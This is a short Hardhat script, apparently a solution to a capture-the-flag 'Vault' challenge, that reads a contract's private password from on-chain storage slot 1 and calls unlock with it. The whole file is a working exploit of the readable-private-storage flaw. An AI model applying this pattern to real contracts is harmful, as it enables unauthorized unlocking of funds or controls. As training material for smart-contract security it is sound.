import { ethers } from "hardhat";
import { Vault__factory } from "../typechain/factories/contracts/Vault__factory";


async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address = "0xBE216D28Df9d85f31De51e09AB37c1F7F53Ea97c";
    let vault = new Vault__factory(signer).attach(instance_address);
    console.log(await vault.locked());

    let password = await provider.getStorageAt(instance_address, 1);
    let tx = await vault.unlock(password);
    await tx.wait();
    console.log(await vault.locked());

    
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
